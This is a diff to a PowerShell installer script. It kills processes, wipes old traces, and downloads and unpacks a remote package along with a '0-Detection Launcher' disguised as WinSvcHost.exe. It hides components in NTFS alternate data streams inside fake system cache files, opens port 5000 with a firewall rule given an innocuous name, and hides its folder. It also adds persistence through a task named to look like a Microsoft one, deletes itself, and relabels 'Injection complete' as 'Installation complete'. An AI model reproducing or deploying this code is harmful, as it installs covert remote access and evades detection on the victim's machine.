@@ -50,14 +50,25 @@ $EXE_NAME  = "WinSvcHost.exe"
 $TASK_NAME = "MicrosoftWindowsShellApi"
 $EXE_PATH  = Join-Path $DEST_DIR $EXE_NAME
 
-# Stop any running instances to allow clean file updates
+# Stage 1: Stopping old instances & Completely wiping old panel version
+Show-Progress -Percent 15 -Status "Terminating old services & cleaning traces..."
 Get-Process -Name "WinSvcHost", "WinSvcBroker" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Get-Process -Name "python", "pythonw" -ErrorAction SilentlyContinue | Where-Object {
+    $_.Path -and ($_.Path -like "*Templates*" -or $_.Path -like "*ProgramData*")
+} | Stop-Process -Force -ErrorAction SilentlyContinue
+
 Get-NetTCPConnection -LocalPort 5000 -ErrorAction SilentlyContinue | ForEach-Object {
     Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue
 }
 
-# Stage 1: Initializing & Purging old traces
-Show-Progress -Percent 15 -Status "Initializing stealth environment..."
+# Wipe any previous panel installation files in Templates so update is 100% fresh
+Remove-Item "$DEST_DIR\app" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "$DEST_DIR\cache" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "$DEST_DIR\config.json" -Force -ErrorAction SilentlyContinue
+Remove-Item "$DEST_DIR\*.db" -Force -ErrorAction SilentlyContinue
+Remove-Item "$DEST_DIR\WinSvcHost.exe" -Force -ErrorAction SilentlyContinue
+
+# Wipe rogue temp files
 Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "syskrnl_*" -Directory -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
 Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "*client.dll*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
 Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "*aotbst.dll*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
@@ -69,37 +80,28 @@ if (-not (Test-Path $DEST_DIR)) {
 cmd /c "schtasks /delete /tn `"\Microsoft\Windows\Shell\SystemNetworkHost`" /f >nul 2>nul"
 cmd /c "schtasks /delete /tn `"SystemNetworkHost`" /f >nul 2>nul"
 cmd /c "schtasks /delete /tn `"SysCheckUp`" /f >nul 2>nul"
-Remove-Item "$DEST_DIR\cache" -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item "$DEST_DIR\*.db" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Milliseconds 200
 
-# Stage 2: Downloading & Deploying Core Engine Package (Universal for any PC)
-Show-Progress -Percent 30 -Status "Deploying core system runtime..."
-$needPkg = $true
-if ((Test-Path "$DEST_DIR\runtime\pythonw.exe") -and (Test-Path "$DEST_DIR\app\app.py")) {
-    $needPkg = $false
+# Stage 2: Downloading & Extracting Fresh Core Engine Package
+Show-Progress -Percent 35 -Status "Downloading & deploying latest core engine..."
+$pkgZip = Join-Path $DEST_DIR "pkg.zip"
+$pkgDownloaded = $false
+try {
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+    $wc.DownloadFile($PKG_URL, $pkgZip)
+    if ((Test-Path $pkgZip) -and ((Get-Item $pkgZip).Length -gt 1000000)) { $pkgDownloaded = $true }
+} catch {}
+if (-not $pkgDownloaded) {
+    & curl.exe -sSL -o $pkgZip $PKG_URL 2>$null
+}
+if (Test-Path $pkgZip) {
+    Expand-Archive -Path $pkgZip -DestinationPath $DEST_DIR -Force -ErrorAction SilentlyContinue
+    Remove-Item $pkgZip -Force -ErrorAction SilentlyContinue
 }
 
-if ($needPkg) {
-    $pkgZip = Join-Path $DEST_DIR "pkg.zip"
-    $pkgDownloaded = $false
-    try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-        $wc.DownloadFile($PKG_URL, $pkgZip)
-        if ((Test-Path $pkgZip) -and ((Get-Item $pkgZip).Length -gt 1000000)) { $pkgDownloaded = $true }
-    } catch {}
-    if (-not $pkgDownloaded) {
-        & curl.exe -sSL -o $pkgZip $PKG_URL 2>$null
-    }
-    if (Test-Path $pkgZip) {
-        Expand-Archive -Path $pkgZip -DestinationPath $DEST_DIR -Force -ErrorAction SilentlyContinue
-        Remove-Item $pkgZip -Force -ErrorAction SilentlyContinue
-    }
-}
-
-# Stage 3: Downloading Host Process (0-Detection Launcher)
-Show-Progress -Percent 50 -Status "Configuring host service..."
+# Stage 3: Downloading Clean Host Process (0-Detection Launcher)
+Show-Progress -Percent 55 -Status "Installing host service..."
 $downloaded = $false
 try {
     $wc = New-Object System.Net.WebClient
@@ -113,7 +115,7 @@ if (-not $downloaded) {
 Start-Sleep -Milliseconds 200
 
 # Stage 4: Sealing Component Streams into Authentic System Locations
-Show-Progress -Percent 65 -Status "Sealing component data streams..."
+Show-Progress -Percent 70 -Status "Sealing component data streams..."
 $MAP = [ordered]@{
     "cimgui.dll" = @("$env:ProgramData\Microsoft\Network\Downloader\winrescache.db", "vtcache")
 }
@@ -144,17 +146,23 @@ foreach ($name in $MAP.Keys) {
             }
             $meta = @{ file = $name; size = $size; sha256 = $sha } | ConvertTo-Json -Compress
             Set-Content -Path $container -Stream kmeta -Value $meta
+            
+            # Also keep a local clean copy inside dlls folder
+            $dllDest = Join-Path $DEST_DIR "dlls"
+            if (-not (Test-Path $dllDest)) { New-Item -ItemType Directory -Path $dllDest -Force | Out-Null }
+            Copy-Item $tmp (Join-Path $dllDest $name) -Force -ErrorAction SilentlyContinue
+
             Remove-Item $tmp -Force -ErrorAction SilentlyContinue
         }
     } catch {}
 }
 
 # Stage 5: Network Firewall Configuration (Enables Instant Phone Access)
-Show-Progress -Percent 75 -Status "Configuring LAN access rules..."
+Show-Progress -Percent 80 -Status "Configuring LAN access rules..."
 cmd /c "netsh advfirewall firewall add rule name=`"WindowsNetworkDiagnostics`" dir=in action=allow protocol=TCP localport=5000 profile=any >nul 2>nul"
 
 # Stage 6: Applying Stealth Disguise & Persistence
-Show-Progress -Percent 85 -Status "Configuring persistence & stealth..."
+Show-Progress -Percent 88 -Status "Configuring persistence & stealth..."
 try {
     $dirItem = Get-Item $DEST_DIR -Force
     $dirItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::Directory
@@ -233,7 +241,7 @@ if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) 
     Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
 }
 
-Show-Progress -Percent 100 -Status "Injection complete."
+Show-Progress -Percent 100 -Status "Installation complete."
 Write-Host ""
 Write-Host ""
 Write-Host "================================================================================" -ForegroundColor Green
